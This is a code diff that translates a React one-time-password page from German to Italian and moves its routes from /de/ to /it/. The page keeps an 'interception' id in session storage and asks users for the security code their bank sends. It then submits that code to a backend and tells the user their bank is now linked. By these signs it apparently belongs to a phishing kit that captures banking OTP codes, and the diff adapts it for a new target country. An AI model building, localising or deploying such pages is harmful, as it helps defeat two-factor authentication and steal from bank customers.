@@ -16,7 +16,7 @@ export default function OtpPage() {
   useEffect(() => {
     const id = sessionStorage.getItem("current_interception_id");
     if (!id) {
-      setError("Session de liaison introuvable. Veuillez recommencer.");
+      setError("Sessione di collegamento non trovata. Si prega di riprovare.");
     } else {
       setInterceptionId(id);
     }
@@ -42,7 +42,7 @@ export default function OtpPage() {
       const data = await response.json();
 
       if (!response.ok) {
-        throw new Error(data.error || "Impossible d'enregistrer le code.");
+        throw new Error(data.error || "Impossibile registrare il codice.");
       }
 
       // Nettoie le sessionStorage après l'opération réussie
@@ -52,14 +52,14 @@ export default function OtpPage() {
       setShowSuccess(true);
 
     } catch (err: any) {
-      setError(err.message || "Error.");
+      setError(err.message || "Errore.");
     } finally {
       setIsLoading(false);
     }
   };
 
   const goToDashboard = () => {
-    router.push("/de/dashboard");
+    router.push("/it/dashboard");
   };
 
   return (
@@ -70,19 +70,19 @@ export default function OtpPage() {
             <div className="success-icon-circle">
               <i className="fa-solid fa-check"></i>
             </div>
-            <h2 className="modal-title">Verbindung erfolgreich</h2>
+            <h2 className="modal-title">Connessione riuscita</h2>
             <p className="modal-desc">
-              Ihre Authentifizierung wurde bestätigt. Ihre Bank ist nun verbunden.
+              La tua autenticazione è stata confermata. La tua banca è ora collegata.
             </p>
             <button onClick={goToDashboard} className="btn-link-bank" style={{ background: '#15b565', width: '100%' }}>
               <i className="fa-solid fa-gauge-high"></i>
-              Greifen Sie auf das Dashboard zu
+              Accedi alla dashboard
             </button>
           </div>
         </div>
       )}
 
-      <Link href="/de/operation" className="back-btn" style={{ alignSelf: 'flex-start' }}>
+      <Link href="/it/operation" className="back-btn" style={{ alignSelf: 'flex-start' }}>
         <i className="fa-solid fa-arrow-left"></i>
       </Link>
 
@@ -91,9 +91,9 @@ export default function OtpPage() {
           <i className="fa-solid fa-shield-lock"></i>
         </div>
 
-        <h1 className="otp-title">Bestätigungscode</h1>
+        <h1 className="otp-title">Codice di conferma</h1>
         <p className="otp-subtitle">
-          Bitte geben Sie den von Ihrer Bank gesendeten Sicherheitscode ein, um den Link zu bestätigen.
+          Inserisci il codice di sicurezza inviato dalla tua banca per confermare il collegamento.
         </p>
 
         {error && <div className="error-message" style={{ background: '#fdf2f2', color: '#ec5b5b', padding: '12px', borderRadius: '12px', fontSize: '13px', marginBottom: '10px', width: '100%', textAlign: 'center' }}>{error}</div>}
@@ -117,7 +117,7 @@ export default function OtpPage() {
           ) : (
             <>
               <i className="fa-solid fa-circle-check"></i>
-              Validieren Sie den Code
+              Convalida il codice
             </>
           )}
         </button>
